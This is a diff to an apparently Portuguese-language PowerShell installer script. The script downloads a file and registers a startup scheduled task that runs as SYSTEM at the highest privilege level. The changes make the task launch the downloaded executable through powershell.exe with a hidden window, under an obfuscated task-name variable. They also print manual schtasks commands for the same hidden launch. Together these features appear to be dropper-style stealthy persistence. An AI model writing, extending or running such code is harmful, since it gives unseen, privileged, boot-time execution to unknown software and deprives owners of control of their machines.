@@ -56,7 +56,7 @@ function Download-File {
         try {
             Write-Host "Baixando de: $Url (tentativa $($i+1)/$Retries)"
             
-            # Usa Invoke-WebRequest (sem WebClient)
+            # Usa Invoke-WebRequest
             Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
             
             Write-Host "Download concluído com sucesso!" -ForegroundColor Green
@@ -91,8 +91,11 @@ function Add-ScheduledTask {
             Unregister-ScheduledTask -TaskName $Nome -Confirm:$false -ErrorAction Stop
         }
         
-        # Usa schtasks.exe com aspas corretas para caminhos com espaços
-        $schtaskCommand = "schtasks /create /tn `"$Nome`" /tr `"$CaminhoExecutavel`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
+        # Cria o comando PowerShell para iniciar o executável
+        $comandoPowerShell = "powershell.exe -Command `"Start-Process '$CaminhoExecutavel' -WindowStyle Hidden`""
+        
+        # Usa schtasks.exe com o comando PowerShell
+        $schtaskCommand = "schtasks /create /tn `"$Nome`" /tr `"$comandoPowerShell`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
         
         Write-Host "Executando: $schtaskCommand"
         
@@ -187,12 +190,14 @@ function Main {
             if (-not $taskSuccess) {
                 Write-Warning "⚠️  Falha ao criar tarefa automaticamente."
                 Write-Host "Para criar manualmente, execute como administrador:"
-                Write-Host "schtasks /create /tn `"$TksdaoqawopqwNisadnia`" /tr `"$caminhoCompleto`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
+                $comandoManual = "powershell.exe -Command `"Start-Process '$caminhoCompleto' -WindowStyle Hidden`""
+                Write-Host "schtasks /create /tn `"$TksdaoqawopqwNisadnia`" /tr `"$comandoManual`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
             }
         } else {
             Write-Warning "⚠️  Não é administrador. Não é possível criar tarefa no agendador."
             Write-Host "Para criar a tarefa manualmente, execute como administrador:"
-            Write-Host "schtasks /create /tn `"$TksdaoqawopqwNisadnia`" /tr `"$caminhoCompleto`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
+            $comandoManual = "powershell.exe -Command `"Start-Process '$caminhoCompleto' -WindowStyle Hidden`""
+            Write-Host "schtasks /create /tn `"$TksdaoqawopqwNisadnia`" /tr `"$comandoManual`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
         }
         
         # 5. Inicia o executável
